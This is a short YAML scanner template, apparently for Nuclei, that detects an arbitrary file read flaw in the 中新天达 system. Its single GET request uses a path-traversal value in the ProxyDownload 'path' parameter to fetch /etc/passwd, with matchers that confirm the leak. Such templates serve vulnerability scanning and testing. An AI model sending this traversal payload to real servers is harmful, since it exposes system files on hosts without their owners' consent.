id: poc-yaml-zxtd-system-anyfile-read
info:
  name: 中新天达系统 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
http:
  - method: GET
    path:
      - "{{BaseURL}}/aexp/ProxyDownload?path=/speedec/webapps/webftp/../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: word
        part: header
        words:
          - "fileName="
      - type: word
        part: body
        words:
          - "<"
        negative: true
